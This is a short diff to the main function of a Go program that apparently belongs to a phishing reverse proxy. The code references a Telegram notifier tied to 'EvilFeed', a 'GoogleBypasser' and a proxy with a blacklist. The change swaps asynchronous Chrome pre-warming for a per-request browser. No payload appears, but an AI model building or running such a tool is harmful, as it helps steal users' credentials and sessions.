@@ -204,13 +204,10 @@ func main() {
 	telegram := core.NewTelegramNotifier(cfg.GetTelegramConfig(), db)
 	_ = telegram // Used by EvilFeed integration
 
-	// Pre-warm Chrome for GoogleBypasser (prevents first-request failure)
-	// This runs in a goroutine so it doesn't block startup
-	go func() {
-		if err := core.PreWarmChrome(); err != nil {
-			log.Warning("Chrome pre-warm failed: %v (GoogleBypasser may fail on first request)", err)
-		}
-	}()
+	// ============================================================================
+	// REMOVED Chrome pre-warming (was part of complex async implementation)
+	// Now using simple synchronous approach with fresh browser per request
+	// ============================================================================
 
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
 
